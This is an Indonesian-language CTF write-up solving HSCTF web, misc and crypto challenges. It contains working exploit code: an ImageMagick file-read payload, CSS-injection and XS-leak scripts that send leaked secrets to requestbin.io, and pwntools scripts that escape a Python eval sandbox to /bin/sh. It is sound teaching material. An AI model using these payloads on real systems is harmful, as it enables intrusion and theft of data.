# WEB
## png-wizard-v2
Saat kita melihat di halaman http://web1.hsctf.com:8004/version tenyata versi dari Imagemagick:
```
Version: ImageMagick 6.9.10-23 Q16 x86_64 20190101 https://imagemagick.org
```
Untuk referensi vulnerabilitynya bisa dilihat disini:
https://imagetragick.com/

Kita  bisa mengirimkan malcious code untuk menyuruh image magic membuat 
```python
import requests
#URL = "http://localhost:8005"
URL = "http://web1.hsctf.com:8005"

MALCIOUS_PNG_PAYLOAD = """push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/app/flag.txt'
pop graphic-context"""
resp = requests.post(URL, files={"file": ("solve.png", MALCIOUS_PNG_PAYLOAD)})
with open("out.png", "wb") as f:
	f.write(resp.content)
```

## markdown-plus-plus
```html
...snip...
<form id="login-form" action="/login" method="POST">
	<input name="username" placeholder="{{ session.username or 'Username'}}" />
	<input type="submit" value="Login" />
</form>
...snip...
```
Dilihat dari `{{ session.username or 'Username'}}` kita dapat mencuri username dari admin.
Saya menggunakan cara yang semi automatis menggunakan script python dibawah ini, untuk membuat request ke `https://requestbin.io/ytti8kyt` jika huruf yang kita cocokkan ada yang benar.
```python
alphabet = 'abcdefghijklmnopqrstuvwxyz_{}'

known_admin = "flag"
malcious = '[c=purple;}\n'
for admin in alphabet:
    admin = known_admin + admin
    malcious += '''input[placeholder^="''' + admin + '''"]{background-image:url("https://requestbin.io/ytti8kyt?''' + admin + '''");}\n'''
malcious +=" test]"

print(malcious)
```

## hsgtf
Pada challenge kali ini kita dapat mengirimkan website apa saja ke admin, ini menyebabkan kita bisa menggunakan teknik cross-site leak.

Yang perlu diperhatikan disini adalah id saat kita memasukkan byte yang benar, dengan id saat kita memasukkan byte yanf salah memiliki id yang berbeda.Jadi disini kita akan menggunakan salah satu teknik di website [ini](https://xsleaks.dev/docs/attacks/id-attribute/) , yaitu dengan memanfaatkan fungsi `focus()` yang akan tidak fokus saat element suatu element itu ada:

Statis web untuk dibagikan ke admin:
```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
	</head>
	<body>
		<div id="foo" tabindex="0">tab</div>
		<script>
			let url = "http://web1.hsctf.com:8001/guess";
			let curr = "flag{";
			let chars = "abcdefghijklmnopqrstuvwxyz_{}";
			let found = false;

			let iframe = document.createElement("iframe");
			iframe.src = url;
			document.body.appendChild(iframe);
			document.getElementById("foo").focus();
			iframe.onload = solve;

			let sleep = (ms) => new Promise((r) => setTimeout(r, ms));

			document.getElementById("foo").onblur = function () {
				if (!found) {
					found = true;
				}
			};

			async function solve() {
				iframe.onload = undefined;
				while (true) {
					document.getElementById("foo").focus();
					for (let c of chars) {
						found = false;
						iframe.src = url + "?guess=" + curr + c;
						await sleep(100);
						iframe.src = url + "?guess=" + curr + c + "#continue";
						await sleep(400);
						if (found) {
							curr += c;
							break;
						}
					}
					console.log(curr);
					fetch("https://requestbin.io/xmt7d4xm", {
						method: "POST",
						body: curr,
					});
				}
			}
		</script>
	</body>
</html>
```
### Referensi
- https://xsleaks.dev/
- https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels
- https://hackmd.io/@aplet123/r1TIzZbYq#HSGTF
# miscellaneous
## paas-v2
Kita bisa membuka file flag di forlder `./` dengan menggunakan function `license()` yang nantinya kita masukkan isi dari file './flag' ke `license()` dengan menggunakan fungsi `setattr()`.
payload ex:
```python
setattr(license,"_Printer__filenames",list(("flag",)))
```

Program python:
```python
from pwn import *

s = remote("paas-v2.hsctf.com", 1337)
s.sendlineafter(b"> ", b'setattr(license,input(),list((input(),)))')
s.sendline(b"_Printer__filenames")
s.sendline(b"flag")
s.sendlineafter(b"> ", b"license()")
print(s.recvuntil(b"> ").decode())
s.interactive()
```
### Another Solution
Dari artikel di bawah kita dapat kesimpulan bahwa juga fungsi `__builtins__` di hapus maka akan muncul lagi ketika eval di execute.
```
If the globals dictionary is present and does not contain a value for the key __builtins__, a reference to the dictionary of the built-in module builtins is inserted under that key before expression is parsed
```
> referensi: https://docs.python.org/3/library/functions.html#eval
```discord
Aplet123 — 06/11/2022
I think python just always has a default value for __builtins__ 
you'll notice if you del globals()["__builtins__"] it comes back
```
Denga skrip di bawah kita dapat mengubah variable `copyright`  dengan fungsi `setattr()` agar valuenya terkait dengan variable `globals()`, setelah itu kita dapat menghapus atribute `__builtins__` dari variable `copyright`, maka setelah pengulangan selanjutnya atribute `__builtins__` akan di insert dengan module `builtins`

program penyelesaian:
```python
from pwn import *

payload1 = '''setattr(copyright,input(),globals()),delattr(copyright,input())'''
payload2 = '''__dict__'''
payload3 = '''__builtins__'''
payload4 = '''breakpoint()'''

payload5 = '''import os;os.system("/bin/sh")'''

c = remote("paas-v2.hsctf.com", 1337)

c.recv(1000);c.recv(1000);

c.sendline(payload1)
c.sendline(payload2)
c.sendline(payload3)
c.sendline(payload4)
c.sendline(payload5)

c.interactive()
```
# cryptography
## OTP
```python
import random
from Crypto.Util.number import bytes_to_long, long_to_bytes

avgflag = int(10000000000 * 2.5)
tries = 10000000
flag = 444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557
print(avgflag-tries//2)
print(avgflag+tries//2)
for s in range(avgflag-tries//2,avgflag+tries//2):
    print(s, end= '\r')
    random.seed(s)

    l = 328

    k = random.getrandbits(l)
    pt = flag ^ k # super secure encryption
    if long_to_bytes(pt).isascii():
        print(long_to_bytes(pt))
```